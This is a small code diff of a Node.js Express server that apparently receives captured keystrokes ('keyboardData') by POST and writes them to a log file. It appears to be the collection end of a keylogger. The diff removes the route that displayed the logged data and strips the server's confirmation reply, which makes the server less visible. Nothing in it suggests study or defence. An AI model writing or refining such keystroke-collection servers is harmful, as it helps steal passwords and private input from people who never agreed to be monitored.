@@ -12,19 +12,10 @@ const rl = readline.createInterface({
 });
 
 rl.question("Enter the port number to use: ", function(port) {
-    app.get("/", (req, res) => {
-        try {
-            const kl_file = fs.readFileSync(`./log.txt`, {encoding:'utf8', flag:'r'});    
-            res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
-        } catch {
-            res.send("<h1>Nothing logged yet.</h1>");
-        }  
-    });
-
     app.post("/", (req, res) => {
         console.log("Request received!");
         fs.writeFileSync(`log.txt`, req.body.keyboardData);
-        res.send("Successfully set the data");
+        res.send()
     });
 
     app.listen(port, () => {
